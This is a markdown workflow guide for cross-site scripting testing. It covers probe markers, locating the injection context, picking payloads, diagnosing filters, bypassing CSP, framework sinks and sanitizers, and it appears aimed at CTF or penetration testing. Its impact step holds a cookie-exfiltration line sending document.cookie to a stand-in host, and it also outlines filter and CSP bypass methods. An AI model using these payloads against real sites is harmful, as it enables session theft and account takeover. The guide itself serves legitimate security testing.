# The end-to-end XSS workflow — probe → context → payload → proof

The ordered procedure — from "I have an injection point" to
"evidence of execution". Follow it top-to-bottom; each step names
the file to open when it stalls.

---

## Step 0 — the marker

```text
XSS_PROBE_<rand>         — the canonical marker
XSS_PROBE_<rand>_<ctx>   — marker + context letter for multi-inject
```

Never probe without a marker — you can't tell "not injected" from
"filtered" from "fired but silent".

---

## Step 1 — find where the value lands

```text
inject the marker → grep the RAW response → note the surrounding text
   - between tags?        → html-context.md
   - inside attr="X"?     → attribute-context.md
   - inside <script>?     → js-context.md
   - inside a URL attr?   → protocols.md
   - nowhere in response? → dom-xss.md (it's JS-side)
   - inside <title>/<textarea>? → the raw-text escapes in html-context.md §6
```

`contexts.md` is the decision tree; `detection.md` is the marker
protocol.

---

## Step 2 — pick the payload for the context

```text
the context's file has the payload set — start with the autofire
variant, keep the interaction variants as fallback
```

The autofire shortlist — `cheatsheet.md` §2. If autofire is
filtered → `filter-bypass.md`.

---

## Step 3 — confirm the fire (or diagnose the filter)

```text
the marker fired → you have XSS — go to step 4
the marker shows in the response but no fire → check:
   - the tag survived but the handler is gone → on* filtered
   - the tag is gone → tag filtered → alternate tag
   - the quotes are gone → quote-filtered → backtick/unquoted
   - the parens are gone → template-literal call
   - entity-encoded → different context or encodings.md
```

The `XSS_PROBE_` diagnostic (`filter-bypass.md` §7) — a layered
probe that names the eaten piece.

---

## Step 4 — prove impact

```javascript
// escalate from alert(1) to the real proof:
alert(document.cookie)                          -- the cookie
alert(document.domain)                          -- the origin
fetch('//me/?c='+document.cookie)               -- the exfil
fetch('/flag').then(r=>r.text()).then(...)      -- the flag fetch
```

For admin-bot: `bot-chains.md`. For stored: `stored-xss.md`. For
blind: `blind-xss.md`.

---

## Step 5 — if CSP blocks

```text
read the policy → csp.md → the directive bypass table
'unsafe-inline' present → inline scripts run
nonce present → leak/reuse it
strict-dynamic → nonce'd script loads anything
allowed-host → JSONP/gadget on that host
no outbound → app-as-channel (exfil-methods.md §5)
```

---

## Step 6 — if a framework renders the sink

```text
framework-sinks.md — angular {{}} / vue v-html / react
dangerouslySetInnerHTML / jquery .html() / lit-html unsafeHTML
```

The framework's own eval — payload shape differs per library.

---

## Step 7 — if sanitizer-washed

```text
mutation-xss.md — mXSS vectors, namespace confusion
gadgets.md — the sanitizer-CVE table + DOM clobbering
```

The serializer-reparser bug — markup that's clean in the first
parse but becomes the payload on reparse.

---

## Step 8 — the falsifier check

```text
before claiming "no XSS": run the full diagnostic —
   XSS_PROBE_bare + tag-probe + attr-probe + handler-probe +
   js-probe + url-probe — each with a marker
   if every variant lands as text or nothing fires → the context
   is genuinely safe for this class
```

`payload-dictionary.md` §14's polyglot set covers the unknown-
context sweep.

---

## The budget — when to stop

```text
- 5 payload families tried per context with no fire → context
  is filtered — pivot to the next context or escalate
- 3 different contexts all filtered → the filter is comprehensive —
  try the mutation/waf layer
- the bot didn't fire within its cycle → try the marker-marker
  diagnostic to distinguish "filtered" from "not yet rendered"
```

The evidence contract — a `confirms` verdict needs the marker in
the raw response AND proof of execution (the exfil hit, the alert,
the DOM change). Reflection alone is inconclusive.
